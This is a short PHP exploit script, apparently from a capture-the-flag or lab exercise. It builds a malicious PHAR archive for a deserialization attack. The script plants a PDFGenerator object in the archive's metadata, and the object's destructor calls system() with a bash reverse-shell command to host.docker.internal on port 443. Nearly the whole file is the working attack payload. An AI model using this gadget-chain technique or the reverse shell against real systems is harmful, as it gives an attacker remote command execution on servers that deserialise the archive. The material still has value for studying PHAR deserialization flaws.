<?php
class PDFGenerator {
    public $callback;
    public $fileName;

    function __destruct() {
        if (is_callable($this->callback)) {
            call_user_func($this->callback, $this->fileName);
        }
    }
}

$evil = new PDFGenerator();

// call_user_func("system", "bash -i >& /dev/tcp/host.docker.internal/443 0>&1");
$evil->callback = "system";
$evil->fileName = "bash -c 'bash -i >& /dev/tcp/host.docker.internal/443 0>&1' &"; // file_put_contents 會將這個值寫到檔案
// $evil->callback = "system";
// $evil->fileName = "ls /";

// delete all old phar
@unlink("evil.phar");

// make a new one
$phar = new Phar("evil.phar");

$phar->startBuffering();

// setting stub as default for marking the start
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// make a dummy file
$phar->addFromString("dummy.txt", "dummy content");

// set metadata as bypass
$phar->setMetadata($evil);

$phar->stopBuffering();
